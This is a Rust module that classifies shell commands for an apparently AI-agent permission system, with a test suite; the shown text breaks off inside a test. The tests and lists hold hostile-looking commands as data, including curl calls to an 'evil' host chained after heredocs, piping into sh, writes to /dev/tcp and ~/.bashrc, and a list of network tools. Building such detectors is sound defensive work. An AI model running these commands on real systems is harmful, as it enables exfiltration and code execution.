//! REQ: RST-07 — shell command classification.
//!
//! Three classes: `Local` (read-only programs), `Exec` (runs project code),
//! `Network` (everything else, including anything the lexer cannot parse).

use crate::detect::parse_ipv4;

#[derive(Clone, Copy, Debug, PartialEq, Eq, PartialOrd, Ord)]
pub enum ShellClass {
    Local,
    Exec,
    Network,
}

#[derive(Clone, Debug)]
pub struct ShellAnalysis {
    pub class: ShellClass,
    /// Hosts the command talks to, as far as they could be extracted.
    pub destinations: Vec<String>,
    /// False when some network command has no extracted destination, or the
    /// command could not be parsed. `internal_only` requires `true` (RST-10).
    pub complete: bool,
}

#[derive(Debug)]
struct Simple {
    argv: Vec<String>,
}

const READ_ONLY: &[&str] = &[
    "ls", "cat", "head", "tail", "grep", "rg", "find", "sed", "awk", "sort", "uniq", "wc", "diff",
    "stat", "file", "pwd", "echo", "tree", "du", "cut", "tr", "basename", "dirname", "realpath",
    "true", "false", "test", "[",
];
const GIT_READ: &[&str] = &[
    "status",
    "diff",
    "log",
    "show",
    "blame",
    "branch",
    "rev-parse",
    "ls-files",
    "remote",
];
const EXEC_PROGS: &[&str] = &[
    "make", "pytest", "mvn", "gradle", "gradlew", "tox", "rspec", "phpunit", "dotnet", "bazel",
];
const NET_PROGS: &[&str] = &[
    "curl",
    "wget",
    "nc",
    "ncat",
    "netcat",
    "ssh",
    "scp",
    "sftp",
    "rsync",
    "psql",
    "mysql",
    "redis-cli",
    "mongosh",
    "kubectl",
    "ftp",
    "telnet",
    "ping",
    "dig",
    "nslookup",
    "docker",
    "helm",
    "terraform",
    "aws",
    "gcloud",
    "az",
];

/// Split into simple commands; `None` when the command is not safely parseable.
fn lex(cmd: &str) -> Option<Vec<Simple>> {
    let chars: Vec<char> = cmd.chars().collect();
    let mut i = 0;
    let mut cmds: Vec<Simple> = vec![];
    let mut argv: Vec<String> = vec![];
    let mut cur = String::new();
    let mut in_word = false;
    // heredocs announced on the current line: (delimiter, `<<-`, delimiter was quoted)
    let mut pending: Vec<(String, bool, bool)> = vec![];
    let flush = |argv: &mut Vec<String>, cur: &mut String, in_word: &mut bool| {
        if *in_word {
            argv.push(std::mem::take(cur));
            *in_word = false;
        }
    };
    while i < chars.len() {
        let c = chars[i];
        match c {
            '\'' => {
                in_word = true;
                i += 1;
                loop {
                    let ch = *chars.get(i)?;
                    i += 1;
                    if ch == '\'' {
                        break;
                    }
                    cur.push(ch);
                }
            }
            '"' => {
                in_word = true;
                i += 1;
                loop {
                    let ch = *chars.get(i)?;
                    i += 1;
                    match ch {
                        '"' => break,
                        '\\' => {
                            let n = *chars.get(i)?;
                            i += 1;
                            if !matches!(n, '"' | '\\' | '$' | '`') {
                                cur.push('\\');
                            }
                            cur.push(n);
                        }
                        '`' => return None,
                        '$' if chars.get(i) == Some(&'(') => return None,
                        _ => cur.push(ch),
                    }
                }
            }
            '\\' => {
                in_word = true;
                i += 1;
                cur.push(*chars.get(i)?);
                i += 1;
            }
            '`' => return None,
            '$' if chars.get(i + 1) == Some(&'(') => return None,
            '<' if chars[i..].starts_with(&['<', '<', '<']) => return None, // here-string
            '<' if chars.get(i + 1) == Some(&'<') && chars.get(i + 2) != Some(&'<') => {
                // heredoc: the body is data for the command, never code of this shell, as long as
                // nothing in it is expanded; here-strings (`<<<`) stay refused
                flush(&mut argv, &mut cur, &mut in_word);
                i += 2;
                let strip_tabs = chars.get(i) == Some(&'-');
                if strip_tabs {
                    i += 1;
                }
                while matches!(chars.get(i), Some(' ' | '\t')) {
                    i += 1;
                }
                let mut delim = String::new();
                let mut quoted = false;
                match chars.get(i) {
                    Some(&q @ ('\'' | '"')) => {
                        quoted = true;
                        i += 1;
                        loop {
                            let ch = *chars.get(i)?;
                            i += 1;
                            if ch == q {
                                break;
                            }
                            delim.push(ch);
                        }
                    }
                    _ => {
                        while let Some(&ch) = chars.get(i) {
                            if ch.is_whitespace()
                                || matches!(ch, ';' | '|' | '&' | '<' | '>' | '(' | ')')
                            {
                                break;
                            }
                            if matches!(ch, '\\' | '\'' | '"' | '$' | '`') {
                                return None;
                            }
                            delim.push(ch);
                            i += 1;
                        }
                    }
                }
                if delim.is_empty() || delim.contains('\n') {
                    return None;
                }
                // what follows on this line is lexed as usual; it must not hide a newline
                argv.push("<<".to_string());
                argv.push(delim.clone());
                pending.push((delim, strip_tabs, quoted));
            }
            '<' if chars.get(i + 1) == Some(&'(') => return None,
            '>' if chars.get(i + 1) == Some(&'(') => return None,
            ' ' | '\t' => {
                flush(&mut argv, &mut cur, &mut in_word);
                i += 1;
            }
            '\n' | ';' | '|' | '&' => {
                flush(&mut argv, &mut cur, &mut in_word);
                // consume doubled operator
                if matches!(c, '|' | '&') && chars.get(i + 1) == Some(&c) {
                    i += 1;
                }
                i += 1;
                if !argv.is_empty() {
                    cmds.push(Simple {
                        argv: std::mem::take(&mut argv),
                    });
                }
                if c == '\n' {
                    // the bodies of the heredocs of the line that just ended, up to their terminators
                    for (delim, strip_tabs, quoted) in pending.drain(..) {
                        loop {
                            if i >= chars.len() {
                                return None; // no terminator
                            }
                            let end = chars[i..]
                                .iter()
                                .position(|&c| c == '\n')
                                .map_or(chars.len(), |n| i + n);
                            let line: String = chars[i..end].iter().collect();
                            i = (end + 1).min(chars.len());
                            let cmp = if strip_tabs {
                                line.trim_start_matches('\t')
                            } else {
                                &line
                            };
                            if cmp == delim {
                                break;
                            }
                            // an unquoted body is expanded by the shell: `$(…)`, backticks, `$VAR`
                            if !quoted && line.contains(['$', '`', '\\']) {
                                return None;
                            }
                        }
                    }
                }
            }
            '>' | '<' => {
                // redirection: keep the operator and target as arguments of the command
                flush(&mut argv, &mut cur, &mut in_word);
                let mut op = String::from(c);
                i += 1;
                while chars.get(i) == Some(&c) || chars.get(i) == Some(&'&') {
                    op.push(chars[i]);
                    i += 1;
                }
                argv.push(op);
            }
            _ => {
                in_word = true;
                cur.push(c);
                i += 1;
            }
        }
    }
    flush(&mut argv, &mut cur, &mut in_word);
    if !argv.is_empty() {
        cmds.push(Simple { argv });
    }
    if !pending.is_empty() {
        return None; // a heredoc without a body
    }
    Some(cmds)
}

fn is_assignment(w: &str) -> bool {
    w.split_once('=').is_some_and(|(k, _)| {
        !k.is_empty() && k.chars().all(|c| c.is_ascii_alphanumeric() || c == '_')
    })
}

fn has_var(w: &str) -> bool {
    w.contains('$')
}

/// Strip path and leading `VAR=value` assignments (which may smuggle `LD_PRELOAD` etc.).
fn program(argv: &[String]) -> Option<(String, &[String])> {
    let mut idx = 0;
    while idx < argv.len() && is_assignment(&argv[idx]) {
        idx += 1;
    }
    let p = argv.get(idx)?;
    let name = p.rsplit('/').next().unwrap_or(p).to_string();
    Some((name, &argv[idx + 1..]))
}

fn classify_one(argv: &[String]) -> (ShellClass, bool /* assignments present */) {
    let has_assign = argv.first().is_some_and(|w| is_assignment(w));
    let Some((prog, args)) = program(argv) else {
        return (ShellClass::Local, false);
    };
    if argv
        .iter()
        .any(|a| a.starts_with("/dev/tcp/") || a.starts_with("/dev/udp/"))
    {
        return (ShellClass::Network, has_assign);
    }
    let any = |f: &dyn Fn(&str) -> bool| args.iter().any(|a| f(a));
    let class = match prog.as_str() {
        "eval" | "source" | "." | "exec" | "xargs" | "env" | "sh" | "bash" | "zsh" | "nohup"
        | "sudo" | "time" | "watch" => ShellClass::Network,
        "find" => {
            // actions that run a program or write a file are not a search
            if any(&|a| {
                matches!(
                    a,
                    "-exec"
                        | "-execdir"
                        | "-ok"
                        | "-okdir"
                        | "-fprint"
                        | "-fprint0"
                        | "-fprintf"
                        | "-fls"
                )
            }) {
                ShellClass::Network
            } else {
                ShellClass::Local
            }
        }
        "awk" | "gawk" | "mawk" | "nawk" => {
            if awk_is_plain(args) {
                ShellClass::Local
            } else {
                ShellClass::Network
            }
        }
        "sed" => {
            if sed_is_plain(args) {
                ShellClass::Local
            } else {
                ShellClass::Network
            }
        }
        // options that run a program named in the argument
        "rg" if any(&|a| a.starts_with("--pre") || a.starts_with("--hostname-bin")) => {
            ShellClass::Network
        }
        "sort" if any(&|a| a.starts_with("--compress-program")) => ShellClass::Network,
        "git" => {
            // the subcommand must be the first word: an option before it (`-C dir`, `-c k=v`,
            // `--exec-path`) can change what the subcommand does or hide which one it is
            let sub = args.first().map(|s| s.as_str());
            let risky_flag = any(&|a| {
                a == "-c"
                    || a.starts_with("--exec-path")
                    || a.starts_with("--upload-pack")
                    || a.starts_with("--receive-pack")
                    || a.starts_with("--config-env")
                    || a.starts_with("--output")
                    || a == "--ext-diff"
                    || a == "--textconv"
            });
            match sub {
                _ if risky_flag => ShellClass::Network,
                Some(sub) if GIT_READ.contains(&sub) => ShellClass::Local,
                // these run the repository's hooks and filters: project code
                Some("add") | Some("commit") | Some("checkout") | Some("restore")
                | Some("stash") | Some("merge") | Some("rebase") | Some("reset") | Some("tag")
                | Some("apply") => ShellClass::Exec,
                _ => ShellClass::Network,
            }
        }
        "go" => match args.first().map(|s| s.as_str()) {
            Some("test") | Some("build") | Some("vet") | Some("run") | Some("fmt") => {
                ShellClass::Exec
            }
            _ => ShellClass::Network,
        },
        "cargo" => match args.first().map(|s| s.as_str()) {
            Some("test") | Some("build") | Some("check") | Some("run") | Some("clippy")
            | Some("fmt") => ShellClass::Exec,
            _ => ShellClass::Network,
        },
        "npm" | "yarn" | "pnpm" => match args.first().map(|s| s.as_str()) {
            Some("test") | Some("run") | Some("t") => ShellClass::Exec,
            _ => ShellClass::Network,
        },
        "python" | "python3" | "node" | "nodejs" | "ruby" | "perl" | "php" | "deno" | "bun" => {
            // code on the command line, in a cluster of short options (`-Bc`, `-le`) or in a
            // long one (`--eval=`), or code on standard input
            let inline = any(&|a| {
                a == "-"
                    || a.starts_with("--eval")
                    || a.starts_with("--print")
                    || (a.starts_with('-')
                        && !a.starts_with("--")
                        && a.chars()
                            .skip(1)
                            .any(|c| matches!(c, 'c' | 'e' | 'E' | 'm' | 'r' | 'p' | 'x' | 'i')))
            });
            if inline || args.is_empty() {
                ShellClass::Network
            } else {
                ShellClass::Exec
            }
        }
        p if READ_ONLY.contains(&p) => ShellClass::Local,
        p if EXEC_PROGS.contains(&p) => ShellClass::Exec,
        p if NET_PROGS.contains(&p) => ShellClass::Network,
        _ => ShellClass::Network,
    };
    // `VAR=value cmd` can change what the program does.
    let class = if has_assign && class < ShellClass::Exec {
        ShellClass::Exec
    } else {
        class
    };
    (class, has_assign)
}

/// `awk` that only reads and prints: no program file, no command, no pipe or redirection, no
/// reading from a command, no extension.
fn awk_is_plain(args: &[String]) -> bool {
    !args.iter().any(|a| {
        a == "-f"
            || a.starts_with("--file")
            || a.starts_with("-i")
            || a.starts_with("--include")
            || a.starts_with("--load")
            || a.starts_with("-l")
            || a.contains("system")
            || a.contains("getline")
            || a.contains("close")
            || a.contains("ENVIRON")
            || a.contains('|')
            || a.contains('>')
            || a.contains('@')
    })
}

/// `sed` whose script is only substitutions, prints and deletes: nothing that runs a command or
/// reads or writes a named file (`e`, `w`, `r`, the `e` and `w` flags of `s`).
fn sed_is_plain(args: &[String]) -> bool {
    let mut scripts: Vec<&str> = vec![];
    let mut i = 0;
    let mut took_script_from_args = false;
    while i < args.len() {
        let a = args[i].as_str();
        match a {
            "-n" | "-E" | "-r" | "-s" | "-u" | "-z" | "--quiet" | "--silent"
            | "--regexp-extended" | "--separate" | "--null-data" | "--unbuffered" => {}
            // in-place editing writes the file it is given: a local effect
            "-i" | "--in-place" => {}
            "-e" | "--expression" => {
                match args.get(i + 1) {
                    Some(sc) => scripts.push(sc),
                    None => return false,
                }
                took_script_from_args = true;
                i += 1;
            }
            _ if a.starts_with("--expression=") => {
                scripts.push(&a["--expression=".len()..]);
                took_script_from_args = true;
            }
            _ if a.starts_with("-i") && !a.starts_with("--") => {} // -i.bak
            _ if a.starts_with('-') && a != "-" => return false,   // -f, --file, --debug, ...
            _ => {
                if !took_script_from_args && scripts.is_empty() {
                    scripts.push(a);
                    took_script_from_args = true;
                } // later words are files
            }
        }
        i += 1;
    }
    !scripts.is_empty() && scripts.iter().all(|sc| sed_script_is_plain(sc))
}

fn sed_script_is_plain(script: &str) -> bool {
    let c: Vec<char> = script.chars().collect();
    let mut i = 0;
    let skip_ws = |i: &mut usize| {
        while *i < c.len() && (c[*i] == ' ' || c[*i] == '\t') {
            *i += 1;
        }
    };
    let number_or_dollar = |i: &mut usize| -> bool {
        let s = *i;
        if *i < c.len() && c[*i] == '$' {
            *i += 1;
            return true;
        }
        while *i < c.len() && c[*i].is_ascii_digit() {
            *i += 1;
        }
        *i > s
    };
    let mut commands = 0;
    loop {
        skip_ws(&mut i);
        while i < c.len() && (c[i] == ';' || c[i] == '\n') {
            i += 1;
            skip_ws(&mut i);
        }
        if i >= c.len() {
            return commands > 0;
        }
        // an address: `N`, `$`, `N,M`, or a `/regex/` (no escapes inside; anything odd is refused)
        if c[i] == '/' {
            i += 1;
            while i < c.len() && c[i] != '/' {
                if c[i] == '\\' {
                    return false;
                }
                i += 1;
            }
            if i >= c.len() {
                return false;
            }
            i += 1;
        } else if number_or_dollar(&mut i) && i < c.len() && c[i] == ',' {
            i += 1;
            if !number_or_dollar(&mut i) {
                return false;
            }
        }
        skip_ws(&mut i);
        match c.get(i) {
            Some('p') | Some('d') | Some('=') | Some('q') => i += 1,
            Some('s') => {
                i += 1;
                let Some(&delim) = c.get(i) else { return false };
                if delim.is_alphanumeric() || matches!(delim, ' ' | '\n' | '\\' | ';') {
                    return false;
                }
                i += 1;
                // pattern and replacement, up to the next unescaped delimiter each
                for _ in 0..2 {
                    loop {
                        match c.get(i) {
                            None => return false,
                            Some('\\') => i += 2,
                            Some(&x) if x == delim => {
                                i += 1;
                                break;
                            }
                            Some('\n') => return false,
                            Some(_) => i += 1,
                        }
                    }
                }
                // flags: only g, p, i, I and a count
                while let Some(&f) = c.get(i) {
                    if matches!(f, 'g' | 'p' | 'i' | 'I' | 'm' | 'M') || f.is_ascii_digit() {
                        i += 1;
                    } else {
                        break;
                    }
                }
            }
            _ => return false,
        }
        commands += 1;
        skip_ws(&mut i);
        match c.get(i) {
            None | Some(';') | Some('\n') => {}
            _ => return false,
        }
    }
}

/// The host a URL names, the way a browser or an HTTP library reads it. `None` when the text is
/// not a URL with an authority. A URL that is ambiguous (a backslash, whitespace or control
/// characters, a percent-encoded or otherwise odd host) gives the host `!ambiguous`, which no
/// internal-only rule accepts: when the reading of the address is in doubt, it is not internal.
const AMBIGUOUS: &str = "!ambiguous";

fn host_of(s: &str) -> Option<String> {
    // scheme://[user@]host[:port]/...
    let (scheme, rest) = s.split_once("://")?;
    if scheme.is_empty()
        || !scheme
            .chars()
            .all(|c| c.is_ascii_alphanumeric() || matches!(c, '+' | '-' | '.'))
    {
        return None;
    }
    // tab, newline and carriage return are dropped by URL parsers: what follows would join the host
    if s.chars().any(|c| c.is_control() || c.is_whitespace()) {
        return Some(AMBIGUOUS.to_string());
    }
    // a backslash ends the authority as a slash does (for special schemes)
    let auth = rest.split(['/', '?', '#', '\\']).next()?;
    let host = auth.rsplit('@').next()?;
    let host = if host.starts_with('[') {
        host.trim_start_matches('[').split(']').next()?
    } else {
        host.split(':').next()?
    };
    if host.is_empty() {
        return None;
    }
    if !host
        .chars()
        .all(|c| c.is_ascii_alphanumeric() || matches!(c, '.' | '-' | '_' | ':'))
    {
        return Some(AMBIGUOUS.to_string());
    }
    Some(host.to_string())
}

fn bare_host(s: &str) -> Option<String> {
    // user@host:path, host:port, host
    let s = s.rsplit('@').next().unwrap_or(s);
    let h = s.split([':', '/']).next().unwrap_or("");
    let ok = !h.is_empty()
        && !h.starts_with('-')
        && h.chars()
            .all(|c| c.is_ascii_alphanumeric() || c == '.' || c == '-' || c == '_');
    (ok && (h.contains('.') || parse_ipv4(h).is_some() || !h.chars().all(|c| c.is_ascii_digit())))
        .then(|| h.to_string())
}

fn destinations_of(argv: &[String]) -> Option<Vec<String>> {
    let (prog, args) = program(argv)?;
    let mut hosts: Vec<String> = vec![];
    let mut i = 0;
    while i < args.len() {
        let a = &args[i];
        if let Some(h) = host_of(a) {
            hosts.push(h);
        } else if matches!(a.as_str(), "-h" | "--host" | "--hostname") {
            if let Some(h) = args.get(i + 1).and_then(|n| bare_host(n)) {
                hosts.push(h);
                i += 1;
            }
        } else if let Some(v) = a.strip_prefix("--host=") {
            if let Some(h) = bare_host(v) {
                hosts.push(h);
            }
        } else if a.starts_with("-h")
            && a.len() > 2
            && matches!(prog.as_str(), "psql" | "mysql" | "redis-cli")
        {
            if let Some(h) = bare_host(&a[2..]) {
                hosts.push(h);
            }
        }
        i += 1;
    }
    if hosts.is_empty() {
        // bare first positional for ssh/nc/ping/telnet/dig/nslookup/scp/rsync
        if matches!(
            prog.as_str(),
            "ssh"
                | "nc"
                | "ncat"
                | "netcat"
                | "ping"
                | "telnet"
                | "dig"
                | "nslookup"
                | "scp"
                | "sftp"
                | "rsync"
                | "ftp"
        ) {
            for a in args.iter().filter(|a| !a.starts_with('-')) {
                if let Some(h) = bare_host(a) {
                    hosts.push(h);
                    if !matches!(prog.as_str(), "scp" | "rsync") {
                        break;
                    }
                }
            }
        }
    }
    (!hosts.is_empty()).then_some(hosts)
}

pub fn analyze(cmd: &str) -> ShellAnalysis {
    let Some(cmds) = lex(cmd) else {
        return ShellAnalysis {
            class: ShellClass::Network,
            destinations: vec![],
            complete: false,
        };
    };
    let mut class = ShellClass::Local;
    let mut dests = vec![];
    let mut complete = true;
    for c in &cmds {
        let (cl, _) = classify_one(&c.argv);
        class = class.max(cl);
        if cl == ShellClass::Network {
            let vars = c.argv.iter().any(|a| has_var(a));
            match destinations_of(&c.argv) {
                Some(h) if !vars => dests.extend(h),
                Some(h) => {
                    dests.extend(h);
                    complete = false;
                }
                None => complete = false,
            }
            // wrappers such as sudo/env/sh: destinations are not knowable
            if let Some((p, _)) = program(&c.argv) {
                if matches!(
                    p.as_str(),
                    "sh" | "bash"
                        | "zsh"
                        | "eval"
                        | "source"
                        | "."
                        | "exec"
                        | "xargs"
                        | "env"
                        | "sudo"
                        | "nohup"
                        | "watch"
                        | "time"
                ) {
                    complete = false;
                }
                if !NET_PROGS.contains(&p.as_str()) {
                    // unknown program: we do not know what it connects to
                    complete = false;
                }
                if matches!(
                    p.as_str(),
                    "kubectl" | "docker" | "helm" | "terraform" | "aws" | "gcloud" | "az"
                ) {
                    complete = false;
                }
            }
        }
    }
    dests.sort();
    dests.dedup();
    ShellAnalysis {
        class,
        destinations: dests,
        complete,
    }
}

/// The file that a command writes, when writing a file is all it does: `cat > f <<'EOF'`,
/// `cat >> f <<'EOF'`, `tee [-a] f <<'EOF'`, `echo|printf words > f`. One simple command, text given in
/// the command (a heredoc or literal words), one literal path. Anything else (a pipe, a second
/// command, a variable, a glob, `..`, a device, an input file, another redirection) is not a plain file
/// write: it stays a shell command. The caller judges such a command as a write of that file, the way
/// it judges the `Write` tool or `apply_patch`.
pub fn file_write_target(cmd: &str) -> Option<String> {
    let cmds = lex(cmd)?;
    let [one] = cmds.as_slice() else { return None };
    let argv = &one.argv;
    let prog = argv.first()?;
    let args = &argv[1..];
    let mut target: Option<&String> = None;
    let mut heredocs = 0;
    let mut i = 0;
    match prog.as_str() {
        "cat" | "echo" | "printf" => {
            let text_cmd = prog != "cat";
            while i < args.len() {
                match args[i].as_str() {
                    ">" | ">>" => {
                        if target.is_some() {
                            return None;
                        }
                        target = Some(args.get(i + 1)?);
                        i += 2;
                    }
                    "<<" => {
                        heredocs += 1;
                        i += 2; // the delimiter
                    }
                    a if text_cmd && !a.starts_with(['<', '>']) && !a.contains('$') => i += 1,
                    _ => return None,
                }
            }
            // `cat` has its text in a heredoc; `echo` and `printf` in their words
            if (prog == "cat") != (heredocs == 1) || (text_cmd && heredocs != 0) {
                return None;
            }
        }
        "tee" => {
            while i < args.len() {
                match args[i].as_str() {
                    "-a" | "--append" if target.is_none() => i += 1,
                    "<<" => {
                        heredocs += 1;
                        i += 2;
                    }
                    a if !a.starts_with(['-', '<', '>']) && target.is_none() => {
                        target = Some(&args[i]);
                        i += 1;
                    }
                    _ => return None,
                }
            }
            if heredocs != 1 {
                return None;
            }
        }
        _ => return None,
    }
    let t = target?;
    plain_path(t).then(|| t.clone())
}

/// The patch text of `apply_patch <<'EOF' … EOF` (also `applypatch`): how Codex calls its own patch
/// tool through the shell. One simple command and one heredoc, nothing else: a second command, a pipe,
/// an argument or a redirection make it an ordinary shell command.
pub fn heredoc_patch(cmd: &str) -> Option<String> {
    let cmds = lex(cmd)?;
    let [one] = cmds.as_slice() else { return None };
    let [prog, op, delim] = one.argv.as_slice() else {
        return None;
    };
    if !matches!(prog.as_str(), "apply_patch" | "applypatch") || op != "<<" {
        return None;
    }
    // `lex` checked that the heredoc has its terminator and that nothing follows it
    let body_start = cmd.find('\n')? + 1;
    let strip_tabs = cmd[..body_start].contains("<<-");
    let mut body = String::new();
    for line in cmd[body_start..].split('\n') {
        let cmp = if strip_tabs {
            line.trim_start_matches('\t')
        } else {
            line
        };
        if cmp == delim {
            return Some(body);
        }
        body.push_str(line);
        body.push('\n');
    }
    None
}

/// The file that `sed -i 's/old/new/' file` edits, when that is all the command does: one in-place
/// literal substitution on one file. A script other than a single `s` command, a flag that runs a
/// command or writes a file (`e`, `w`), several files and a pipe are an ordinary shell command.
pub fn sed_inplace_target(cmd: &str) -> Option<String> {
    let cmds = lex(cmd)?;
    let [one] = cmds.as_slice() else { return None };
    let (prog, args) = program(&one.argv)?;
    if prog != "sed" || one.argv.first().is_some_and(|w| is_assignment(w)) {
        return None;
    }
    let mut script: Option<&String> = None;
    let mut file: Option<&String> = None;
    let mut in_place = false;
    for a in args {
        match a.as_str() {
            "-i" | "--in-place" => in_place = true,
            "-E" | "-r" | "--regexp-extended" => {}
            // `-i.bak`: a suffix for the backup copy
            s if s.starts_with("-i") && s.len() <= 12 && !s[2..].contains(['-', '/', ' ']) => {
                in_place = true
            }
            s if s.starts_with("--in-place=") => in_place = true,
            s if s.starts_with('-') || s.starts_with(['<', '>']) => return None,
            _ if script.is_none() => script = Some(a),
            _ if file.is_none() => file = Some(a),
            _ => return None,
        }
    }
    if !in_place || !sed_script_is_a_substitution(script?) {
        return None;
    }
    let t = file?;
    plain_path(t).then(|| t.clone())
}

/// `s<d>pattern<d>replacement<d>flags` with a delimiter that is not a letter, a digit, a space or a
/// backslash, and flags from `gIiMm` and digits only.
fn sed_script_is_a_substitution(script: &str) -> bool {
    let mut it = script.chars();
    if it.next() != Some('s') {
        return false;
    }
    let Some(d) = it.next() else { return false };
    if d.is_alphanumeric() || d.is_whitespace() || d == '\\' || d == ';' || d == '{' || d == '}' {
        return false;
    }
    let mut parts: Vec<String> = vec![String::new()];
    let mut escaped = false;
    for c in it {
        if c == d && !escaped {
            parts.push(String::new());
            continue;
        }
        // (`parts` is never empty)
        if let Some(last) = parts.last_mut() {
            last.push(c);
        }
        escaped = !escaped && c == '\\';
    }
    !escaped && parts.len() == 3 && parts[2].chars().all(|c| "gIiMm0123456789".contains(c))
}

fn plain_path(t: &str) -> bool {
    !(t.is_empty()
        || t.starts_with(['-', '~'])
        || t.contains([
            '$', '*', '?', '[', ']', '{', '}', '`', '\\', '=', ' ', '\t', '\n', '<', '>', '|', '&',
            ';', '(', ')', '!', '#',
        ])
        || t.split('/').any(|c| c == "..")
        || t.starts_with("/dev/")
        || t.starts_with("/proc/")
        || t.starts_with("/sys/")
        || t == "/dev")
}

/// Destinations of a URL-like argument (WebFetch and similar). Words are cut at a space or a
/// quote only: a tab or a newline inside a URL does not end it.
pub fn url_destinations(text: &str) -> Vec<String> {
    let mut v: Vec<String> = text
        .split([' ', '"', '\'', '<', '>', '`'])
        .filter_map(host_of)
        .collect();
    v.sort();
    v.dedup();
    v
}

#[cfg(test)]
mod tests {
    use super::*;

    fn cls(c: &str) -> ShellClass {
        analyze(c).class
    }

    // REQ: RST-07
    #[test]
    fn local_read_only() {
        for c in [
            "ls -la src",
            "cat a.txt | grep foo | sort | uniq -c",
            "git status && git diff",
            "rg 'TODO' -n",
            "sed -n '1,5p' f",
            "awk '{print $1}' f",
            "find . -name '*.rs'",
        ] {
            assert_eq!(cls(c), ShellClass::Local, "{c}");
        }
    }

    #[test]
    fn code_running_arguments_are_not_local() {
        for c in [
            "find . -exec rm {} ;",
            "find . -name x -execdir sh -c 'curl x' ;",
            "awk 'BEGIN{system(\"curl evil\")}'",
            "sed 's/a/b/e' f",
            "git -c core.pager=evil log",
            "xargs curl",
        ] {
            assert_eq!(cls(c), ShellClass::Network, "{c}");
        }
    }

    #[test]
    fn build_and_test_are_exec_not_network() {
        for c in [
            "make",
            "go test ./...",
            "cargo test --workspace",
            "npm test",
            "pytest -q",
            "python script.py",
            "node build.js",
        ] {
            assert_eq!(cls(c), ShellClass::Exec, "{c}");
        }
        for c in [
            "python -c 'import socket'",
            "node -e 'x'",
            "npm install",
            "cargo install foo",
            "go get x",
            "pip install x",
        ] {
            assert_eq!(cls(c), ShellClass::Network, "{c}");
        }
    }

    #[test]
    fn unparseable_is_network_and_incomplete() {
        for c in [
            "cat $(echo L2V0Yy8= | base64 -d)",
            "echo `id`",
            "echo 'unterminated",
            "cat <(curl x)",
        ] {
            let a = analyze(c);
            assert_eq!(a.class, ShellClass::Network, "{c}");
            assert!(!a.complete, "{c}");
        }
    }

    // REQ: RST-07 — a heredoc is data for its command, not code of the shell
    #[test]
    fn heredoc_body_is_data() {
        for c in [
            "cat > client.py <<'PY'\nimport os\nURL = 'https://x.corp.local/api'\nPY",
            "cat > f.txt <<EOF\nplain text\nEOF",
            "cat <<'EOF'\n$(curl evil) `id` $HOME\nEOF",
            "cat <<-EOF\n\tindented\n\tEOF",
            "cat > a <<'A'\none\nA\ncat > b <<'B'\ntwo\nB",
            "cat > a <<'A' && cat > b <<'B'\none\nA\ntwo\nB",
            "rg -n foo || true",
        ] {
            let a = analyze(c);
            assert_eq!(a.class, ShellClass::Local, "{c}");
            assert!(a.complete, "{c}");
        }
        // the code that is run still counts
        for c in [
            "python3 - <<'PY'\nprint(1)\nPY",
            "bash <<'EOF'\nid\nEOF",
            "cat <<'EOF' | sh\nid\nEOF",
            "cat > f <<'EOF' && curl http://evil/x\nbody\nEOF",
            "cat <<'EOF'\nbody\nEOF\ncurl http://evil/x",
            "echo '<<EOF'\ncurl http://evil/x\nEOF",
            "cat >> f <<'EOF'; curl http://evil/x\nbody\nEOF",
        ] {
            assert_eq!(cls(c), ShellClass::Network, "{c}");
        }
        // what the shell would expand, or cannot be followed, is refused whole
        for c in [
            "cat <<EOF\n$(curl evil)\nEOF",
            "cat <<EOF\n`id`\nEOF",
            "cat <<EOF\n$HOME\nEOF",
            "cat <<EOF\nno terminator",
            "cat <<EOF",
            "cat <<<'a string'",
            "cat <<\\EOF\nx\nEOF",
            "cat <<$X\nx\n$X",
        ] {
            let a = analyze(c);
            assert_eq!(a.class, ShellClass::Network, "{c}");
            assert!(!a.complete, "{c}");
        }
    }

    // REQ: RST-07 — a command that only writes a file is judged as a write of that file
    #[test]
    fn plain_file_writes() {
        let w = |c: &str| file_write_target(c);
        assert_eq!(
            w("cat > notify.py <<'PY'\nTO = 'x'\nPY").as_deref(),
            Some("notify.py")
        );
        assert_eq!(
            w("cat >> a/b.txt << EOF\nline\nEOF").as_deref(),
            Some("a/b.txt")
        );
        assert_eq!(
            w("tee conf.ini <<'EOF'\n[a]\nEOF").as_deref(),
            Some("conf.ini")
        );
        assert_eq!(
            w("tee -a conf.ini <<'EOF'\nx\nEOF").as_deref(),
            Some("conf.ini")
        );
        assert_eq!(w("echo 'A=1' >> .env").as_deref(), Some(".env"));
        assert_eq!(
            w("printf '%s\\n' hello > out.txt").as_deref(),
            Some("out.txt")
        );
        assert_eq!(
            w("cat > /tmp/x/f.py <<'PY'\nx\nPY").as_deref(),
            Some("/tmp/x/f.py")
        );
        for c in [
            // not only a write: a second command, a pipe, an input, a variable, a substitution
            "cat > f <<'EOF'\nx\nEOF\ncurl http://evil/x",
            "cat > f <<'EOF' && curl http://evil/x\nx\nEOF",
            "cat <<'EOF' | sh\nx\nEOF",
            "cat < secret.txt > f",
            "cat a.txt > f",
            "cat > f",
            "echo $HOME > f",
            "echo `id` > f",
            "echo x > $F",
            "echo x > f 2>&1",
            "echo x | tee f",
            "sed -i s/a/b/ f",
            "python3 - <<'PY'\nopen('f','w')\nPY",
            // a target that is not one literal file
            "cat > ../f <<'EOF'\nx\nEOF",
            "cat > a/../../f <<'EOF'\nx\nEOF",
            "cat > /dev/tcp/1.2.3.4/80 <<'EOF'\nx\nEOF",
            "cat > *.py <<'EOF'\nx\nEOF",
            "cat > ~/.bashrc <<'EOF'\nx\nEOF",
            "cat > f > g <<'EOF'\nx\nEOF",
            "tee f g <<'EOF'\nx\nEOF",
            "tee <<'EOF'\nx\nEOF",
            "FOO=1 cat > f <<'EOF'\nx\nEOF",
        ] {
            assert_eq!(w(c), None, "{c}");
        }
    }

    // REQ: RST-07 — `apply_patch <<EOF` and `sed -i s///` are writes of a file, nothing else is
    #[test]
    fn patch_heredoc_and_sed_in_place() {
        let patch =
            "*** Begin Patch\n*** Update File: notify.py\n@@\n-TO = 'a'\n+TO = 'b'\n*** End Patch";
        for prog in ["apply_patch", "applypatch"] {
            let cmd = format!("{prog} <<'PATCH'\n{patch}\nPATCH");
            assert_eq!(
                heredoc_patch(&cmd).as_deref(),
                Some(format!("{patch}\n").as_str()),
                "{cmd}"
            );
        }
        for c in [
            "apply_patch <<'P'\nx\nP\ncurl http://evil/x",
            "apply_patch <<'P' && curl http://evil/x\nx\nP",
            "apply_patch <<'P' | sh\nx\nP",
            "apply_patch --help <<'P'\nx\nP",
            "apply_patch",
            "cat <<'P'\nx\nP",
